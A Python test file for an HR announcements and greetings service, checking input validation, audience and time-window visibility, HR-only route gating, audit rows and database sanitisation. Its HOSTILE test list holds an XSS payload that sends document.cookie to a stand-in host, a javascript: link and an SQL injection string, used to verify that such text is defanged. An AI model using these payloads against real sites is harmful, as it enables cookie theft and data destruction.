"""Announcements and greetings: A1–A12 and the negative tests N1–N14 of docs/BUSINESS_RULES.md.

Most of it runs without a database, because the rules that matter were kept out of SQL on purpose:
`services/announcements.visible()` decides what the home card shows (the 24-hour and 14-day windows in
Riyadh time, the expiry, the audience, the seven keys), and `validate_new()` / `validate_edit()` decide
what text and which fields are accepted before anything is read or written. The routes are called
directly to prove the role gate (N1, N10) and that an audit row never carries the text (A11).

The last tests need `CANONICAL_TEST_DATABASE_URL` (a throwaway copy with migration 003) and run inside a
transaction that is rolled back: former employees never receive (A1, N5), hiding takes the bell entries
back (D4), and HR's bell does not show a greeting addressed to the HR pool (A5, N6).
"""

from __future__ import annotations

import inspect
import os
import uuid
from datetime import date, datetime, timedelta
from types import SimpleNamespace

import pytest

from app.core.errors import ApiError
from app.core.scheduling import RIYADH
from app.routers import announcements as ann_router
from app.routers import canonical
from app.services import announcements as ann
from app.services import notify_email

TODAY = date(2026, 11, 2)
NOW = datetime(2026, 11, 2, 12, 0, tzinfo=RIYADH)
HR = {"employee_id": "hr1", "role": "hr", "username": "hr1", "name_ar": "موارد"}
EMPLOYEE = {"employee_id": "e1", "role": "employee", "username": "e1", "name_ar": "موظف"}
MANAGER = {"employee_id": "m1", "role": "manager", "username": "m1", "name_ar": "مدير"}
CEO = {"employee_id": "c1", "role": "ceo", "username": "c1", "name_ar": "رئيس"}
HOSTILE = ['<script>alert(1)</script>', '<img src=x onerror="fetch(\'//evil.example/\'+document.cookie)">',
           '<a href="javascript:alert(1)">اضغط</a>', '"; DROP TABLE ariba_announcements; --']


def refused(exc_info, status: int, code: str) -> None:
    assert (exc_info.value.status, exc_info.value.code) == (status, code), exc_info.value.message


def row(**over):
    base = {"id": uuid.uuid4(), "kind": "announcement", "occasion": None, "title": "t", "body": "b",
            "pinned": False, "created_at": NOW - timedelta(hours=1), "audience": "all", "employer_id": None,
            "employee_ids": [], "expires_on": None}
    return {**base, **over}


# ------------------------------------------------------------------------------------ A11: plain text

@pytest.mark.parametrize("text", HOSTILE)
def test_validation_neither_runs_nor_rewrites_hostile_text(text):
    """Plain text: validation accepts it as typed; the database trigger defangs it on write (see the db test)."""
    data = ann.validate_new({"title": text, "body": text}, TODAY)
    assert data["title"] == text and data["body"] == text


def test_control_characters_are_dropped_and_newlines_kept():
    data = ann.validate_new({"title": "a\x00b\x1b[31mc\x7f", "body": "line1\r\nline2\tx\x08"}, TODAY)
    assert data["title"] == "ab[31mc" and data["body"] == "line1\nline2\tx"


def test_title_is_required_and_refused_not_cut_above_200():
    assert ann.validate_new({"title": "x" * 200}, TODAY)["title"] == "x" * 200
    for bad in ({"title": "x" * 201}, {"title": "   "}, {}, {"title": 5}):
        with pytest.raises(ApiError) as e:
            ann.validate_new(bad, TODAY)
        refused(e, 422, "invalid_request")


def test_body_is_refused_above_2000():
    with pytest.raises(ApiError) as e:
        ann.validate_new({"title": "t", "body": "x" * 2001}, TODAY)
    refused(e, 422, "invalid_request")


@pytest.mark.parametrize("body", [
    {"title": "t", "kind": "memo"},
    {"title": "t", "audience": "everyone"},
    {"title": "t", "audience": "employer"},
    {"title": "t", "audience": "employer", "employer_id": True},
    {"title": "t", "audience": "employees"},
    {"title": "t", "audience": "employees", "employee_ids": ["  "]},
    {"title": "t", "kind": "greeting", "occasion": "recovery"},
    {"title": "t", "kind": "greeting", "occasion": "<b>"},
    {"title": "t", "expires_on": "2026-11-01"},
    {"title": "t", "expires_on": "02/11/2026"},
    {"title": "t", "pinned": "yes"},
])
def test_n13_n14_bad_bodies_are_refused_before_anything_is_read(body):
    with pytest.raises(ApiError) as e:
        ann.validate_new(body, TODAY)
    refused(e, 422, "invalid_request")


def test_an_announcement_has_no_occasion_and_a_greeting_defaults_to_other():
    assert ann.validate_new({"title": "t", "occasion": "wedding"}, TODAY)["occasion"] is None
    assert ann.validate_new({"title": "t", "kind": "greeting"}, TODAY)["occasion"] == "other"
    assert "recovery" not in ann.OCCASIONS


def test_n8_an_edit_cannot_move_the_audience():
    for field in ann.FIXED:
        with pytest.raises(ApiError) as e:
            ann.validate_edit({field: "x", "title": "t"}, TODAY)
        refused(e, 422, "invalid_request")
    with pytest.raises(ApiError):
        ann.validate_edit({}, TODAY)
    assert ann.validate_edit({"pinned": True, "title": " new "}, TODAY) == {"pinned": True, "title": "new"}


# ------------------------------------------------------------------------------------ A3/A4: the card

def test_n4_the_card_has_exactly_the_seven_keys():
    secret = row(audience="employees", employee_ids=["e1", "e2", "e3"], employer_id=None)
    items = ann.visible([secret], "e1", None, NOW)
    assert len(items) == 1 and set(items[0]) == set(ann.CARD_KEYS)
    # The audience and the other recipients never reach the card. Compare whole values, not a substring of the
    # rendered dict: a uuid4 can contain "e2" (this assertion used to fail once in every few runs).
    assert "employees" not in items[0].values()
    assert all(value not in (["e1", "e2", "e3"], "e2", "e3") for value in items[0].values())


def test_n7_greeting_window_is_24_hours_from_now_in_riyadh():
    fresh = row(kind="greeting", occasion="birthday", created_at=NOW - timedelta(hours=23, minutes=59))
    stale = row(kind="greeting", occasion="birthday", created_at=NOW - timedelta(hours=24, minutes=1))
    assert [i["id"] for i in ann.visible([fresh, stale], "e1", None, NOW)] == [str(fresh["id"])]


def test_n7_announcement_window_is_14_days_unless_pinned():
    young = row(created_at=NOW - timedelta(days=13, hours=23))
    old = row(created_at=NOW - timedelta(days=14, hours=1))
    old_pinned = row(created_at=NOW - timedelta(days=60), pinned=True)
    got = {i["id"] for i in ann.visible([young, old, old_pinned], "e1", None, NOW)}
    assert got == {str(young["id"]), str(old_pinned["id"])}


def test_a_greeting_is_not_kept_alive_by_a_pin():
    pinned_greeting = row(kind="greeting", pinned=True, created_at=NOW - timedelta(days=2))
    assert ann.visible([pinned_greeting], "e1", None, NOW) == []


def test_expiry_uses_the_riyadh_calendar_day():
    """00:30 on 3 Nov in Riyadh is still 2 Nov in UTC: a row that expired on 2 Nov is gone in Riyadh."""
    just_after_midnight = datetime(2026, 11, 3, 0, 30, tzinfo=RIYADH)
    expired = row(expires_on=date(2026, 11, 2), created_at=just_after_midnight - timedelta(hours=2))
    today_last = row(expires_on=date(2026, 11, 3), created_at=just_after_midnight - timedelta(hours=2))
    got = {i["id"] for i in ann.visible([expired, today_last], "e1", None, just_after_midnight)}
    assert got == {str(today_last["id"])}


def test_n2_n3_the_audience_must_match_me_now():
    mine = row(audience="employees", employee_ids=["e1"])
    colleague = row(audience="employees", employee_ids=["e2"])
    my_employer = row(audience="employer", employer_id=3)
    other_employer = row(audience="employer", employer_id=4)
    everyone = row(audience="all")
    got = {i["id"] for i in ann.visible([mine, colleague, my_employer, other_employer, everyone], "e1", 3, NOW)}
    assert got == {str(mine["id"]), str(my_employer["id"]), str(everyone["id"])}
    # an account without an employee record sees only `all`
    assert {i["id"] for i in ann.visible([mine, my_employer, everyone], None, None, NOW)} == {str(everyone["id"])}


def test_pinned_first_then_newest_and_at_most_ten():
    rows = [row(created_at=NOW - timedelta(hours=h)) for h in range(1, 14)]
    pinned = row(pinned=True, created_at=NOW - timedelta(days=30))
    items = ann.visible(rows + [pinned], "e1", None, NOW)
    assert len(items) == ann.CARD_LIMIT and items[0]["id"] == str(pinned["id"])
    assert items[1]["id"] == str(rows[0]["id"])


# ------------------------------------------------------------------------------------ A2: the role gate

HR_ROUTES = [
    (ann_router.list_announcements, {"limit": 10}),
    (ann_router.send_announcement, {"body": {"title": "t"}, "request": None}),
    (ann_router.edit_announcement, {"announcement_id": str(uuid.uuid4()), "body": {"title": "t"}, "request": None}),
    (ann_router.hide_announcement, {"announcement_id": str(uuid.uuid4()), "request": None}),
    (ann_router.list_occasions, {}),
    (ann_router.save_occasion, {"body": {}, "request": None}),
    (ann_router.hide_occasion, {"occasion_id": str(uuid.uuid4()), "request": None}),
    (ann_router.get_greetings, {}),
    (ann_router.put_greetings, {"body": {"enabled": True}, "request": None}),
    (ann_router.run_auto, {"request": None}),
    (ann_router.get_announcement_mail, {}),
    (ann_router.put_announcement_mail, {"body": {"email": True}, "request": None}),
]


class ExplodingDB:
    """Any database access fails the test: a refused caller must be refused before a query."""

    def __getattr__(self, name):
        raise AssertionError(f"the database was touched ({name}) before the role check")


@pytest.mark.parametrize("actor", [EMPLOYEE, MANAGER, CEO], ids=["employee", "manager", "ceo"])
@pytest.mark.parametrize("route,kwargs", HR_ROUTES, ids=[r.__name__ for r, _ in HR_ROUTES])
def test_n1_n10_only_hr_reaches_the_hr_routes(route, kwargs, actor):
    with pytest.raises(ApiError) as e:
        route(**kwargs, actor=actor, db=ExplodingDB())
    refused(e, 403, "forbidden")


def test_every_hr_route_is_covered_by_the_gate_test():
    gated = {r.__name__ for r, _ in HR_ROUTES}
    routes = {name for name, fn in inspect.getmembers(ann_router, inspect.isfunction)
              if fn.__module__ == ann_router.__name__ and not name.startswith("_")}
    assert routes - gated == {"my_announcements"}


# ------------------------------------------------------------------------------------ A11: the audit row

def test_the_audit_row_never_carries_the_text(monkeypatch):
    audits = []
    monkeypatch.setattr(canonical, "_write_audit", lambda *a, **k: audits.append((a, k)))
    monkeypatch.setattr(ann, "create", lambda db, actor, data: ("id-1", 3))
    monkeypatch.setattr(ann, "edit", lambda db, actor, i, ch: {"id": i, "kind": "announcement"})
    monkeypatch.setattr(ann, "hide", lambda db, actor, i: ({"id": i, "kind": "greeting", "audience": "all",
                                                             "sent_count": 3}, 3))
    db = SimpleNamespace(commit=lambda: None)
    secret_title, secret_body = "عنوان-سري", "نص-سري-لا-يدخل-السجل"
    assert ann_router.send_announcement({"title": secret_title, "body": secret_body}, None, actor=HR, db=db)["sent"] == 3
    ann_router.edit_announcement("a1", {"title": secret_title, "body": secret_body}, None, actor=HR, db=db)
    assert ann_router.hide_announcement("a1", None, actor=HR, db=db) == {"ok": True, "removed": 3}
    assert [a[4] for a, _ in audits] == ["announcement_create", "announcement_edit", "greeting_delete"]
    assert secret_title not in repr(audits) and secret_body not in repr(audits)


# ------------------------------------------------------------------------------------ A9, D5: switches

def test_switches_ship_off_and_only_a_literal_true_turns_one_on():
    assert ann._switches(None, ann.AUTO_DEFAULT) == {"enabled": False, "birthday": False, "anniversary": False,
                                                      "custom": False}
    assert ann._switches({"email": "true", "extra": True}, ann.MAIL_DEFAULT) == {"email": False}
    for bad in ({}, {"email": 1}, {"sms": True}):
        with pytest.raises(ApiError):
            ann.validate_switches(bad, ann.MAIL_DEFAULT)


def test_n11_run_auto_with_the_switch_off_writes_nothing():
    statements = []

    class SettingsOnly:
        def execute(self, statement, params=None):
            statements.append(str(statement))
            return SimpleNamespace(first=lambda: None)

    assert ann.run_auto(SettingsOnly(), TODAY) == 0
    assert all("INSERT" not in s for s in statements)


def test_d5_greetings_are_never_mailed_and_announcements_only_behind_the_switch():
    sql = notify_email.MAILABLE_KIND_SQL
    assert "<> 'greeting'" in sql and "announcements_mail" in sql and "'email' = 'true'" in sql
    assert sql in str(notify_email.PENDING_SQL)
    assert "MAILABLE_KIND_SQL" in inspect.getsource(notify_email.pending_count)


# ------------------------------------------------------------------------------------ A5: the bell

class BellDB:
    def __init__(self, rows):
        self.rows, self.sql = rows, []

    def execute(self, statement, params=None):
        self.sql.append(str(statement))
        rows = self.rows if "FROM public.workflow_notifications n" in str(statement) else []
        return SimpleNamespace(mappings=lambda: rows)


def test_the_bell_shows_announcements_and_greetings_as_themselves():
    at = NOW
    db = BellDB([{"id": uuid.uuid4(), "kind": "greeting", "title": "كل عام وأنت بخير", "body": "x", "created_at": at,
                  "read_at": None, "req_status": None, "request_type": None},
                 {"id": uuid.uuid4(), "kind": "announcement", "title": "إعلان", "body": "y", "created_at": at,
                  "read_at": None, "req_status": None, "request_type": None}])
    out = canonical.notifications(actor=HR, db=db)
    assert {(n["kind"], n["target"]) for n in out} == {("greeting", "index"), ("announcement", "index")}


def test_a5_the_hr_pool_never_forwards_personal_kinds():
    db = BellDB([])
    canonical.notifications(actor=HR, db=db)
    assert canonical._NOT_PERSONAL_KIND in db.sql[0]
    # "read all" by an HR account must not mark a colleague's greeting read either
    sent = []
    recorder = SimpleNamespace(execute=lambda statement, params=None: sent.append(str(statement)), commit=lambda: None)
    canonical.mark_notifications_read(None, actor=HR, db=recorder)
    assert len(sent) == 1 and canonical._NOT_PERSONAL_KIND in sent[0]


# ------------------------------------------------------------------------------------ against a real copy

needs_db = pytest.mark.skipif(not os.environ.get("CANONICAL_TEST_DATABASE_URL"),
                              reason="Requires a disposable restored canonical PostgreSQL database with migration 003")


@pytest.fixture
def db():
    from sqlalchemy import create_engine
    from sqlalchemy.orm import Session

    engine = create_engine(os.environ["CANONICAL_TEST_DATABASE_URL"])
    connection = engine.connect()
    outer = connection.begin()
    session = Session(bind=connection)
    try:
        yield session
    finally:
        session.close()
        outer.rollback()
        connection.close()
        engine.dispose()


def _scalar(db, sql, **params):
    from sqlalchemy import text
    return db.execute(text(sql), params).scalar()


@needs_db
def test_a1_n5_former_employees_never_receive(db):
    current = _scalar(db, f"SELECT count(*) FROM public.employee_directory d WHERE {ann.CURRENT}")
    assert len(ann.recipients(db, "all", None, [])) == current
    former = _scalar(db, f"SELECT employee_id FROM public.employee_directory d WHERE NOT ({ann.CURRENT}) LIMIT 1")
    alive = _scalar(db, f"SELECT employee_id FROM public.employee_directory d WHERE {ann.CURRENT} LIMIT 1")
    before = _scalar(db, "SELECT count(*) FROM public.workflow_notifications")
    with pytest.raises(ApiError) as e:
        ann.create(db, HR, ann.validate_new({"title": "t", "audience": "employees",
                                              "employee_ids": [alive, former]}, TODAY))
    refused(e, 422, "invalid_recipients")
    assert e.value.details == [former]
    assert _scalar(db, "SELECT count(*) FROM public.workflow_notifications") == before


@needs_db
def test_a11_hostile_text_is_stored_defanged_on_the_card_and_in_the_bell(db):
    """The database's own ariba_sanitize trigger (003 attaches it) does to an announcement what it does to
    every other stored text: < > " become look-alike characters, and the bell entry matches the card."""
    hostile = HOSTILE[1]
    aid, _ = ann.create(db, HR, ann.validate_new({"title": hostile, "body": hostile}, TODAY))
    title, body = db.execute(__import__("sqlalchemy").text(
        "SELECT title, body FROM public.ariba_announcements WHERE id=CAST(:a AS uuid)"), {"a": aid}).one()
    assert not any(c in title + body for c in '<>"') and "onerror" in title
    bell = _scalar(db, """SELECT n.title FROM public.workflow_notifications n JOIN public.ariba_announcement_notifs l
                          ON l.notification_id=n.id WHERE l.announcement_id=CAST(:a AS uuid) LIMIT 1""", a=aid)
    assert bell == title


@needs_db
def test_d4_hiding_takes_the_bell_entries_back(db):
    aid, sent = ann.create(db, HR, ann.validate_new({"title": "إعلان تجريبي"}, TODAY))
    assert sent > 0
    assert _scalar(db, "SELECT count(*) FROM public.ariba_announcement_notifs WHERE announcement_id=CAST(:a AS uuid)",
                   a=aid) == sent
    row, removed = ann.hide(db, HR, aid)
    assert removed == sent
    assert _scalar(db, """SELECT count(*) FROM public.workflow_notifications WHERE kind='announcement'
                          AND title='إعلان تجريبي'""") == 0
    with pytest.raises(ApiError) as e:
        ann.hide(db, HR, aid)
    refused(e, 404, "not_found")


@needs_db
def test_n6_hr_does_not_see_a_greeting_addressed_to_the_hr_pool(db):
    pool = [r for r in db.execute(__import__("sqlalchemy").text("SELECT public.ariba_hr_pool()")).scalars()]
    target = next((p for p in pool if _scalar(db, f"SELECT 1 FROM public.employee_directory d WHERE employee_id=:e AND {ann.CURRENT}", e=p)), None)
    if target is None:
        pytest.fail("the HR pool has no current employee to address; the check cannot run on this copy")
    ann.create(db, HR, ann.validate_new({"title": "تهنئة خاصة", "kind": "greeting", "occasion": "newborn",
                                          "audience": "employees", "employee_ids": [target]}, TODAY))
    other_hr = {"employee_id": "__nobody__", "role": "hr"}
    assert all(n["title"] != "تهنئة خاصة" for n in canonical.notifications(actor=other_hr, db=db))
    owner = {"employee_id": target, "role": "employee"}
    assert any(n["title"] == "تهنئة خاصة" and n["kind"] == "greeting" for n in canonical.notifications(actor=owner, db=db))
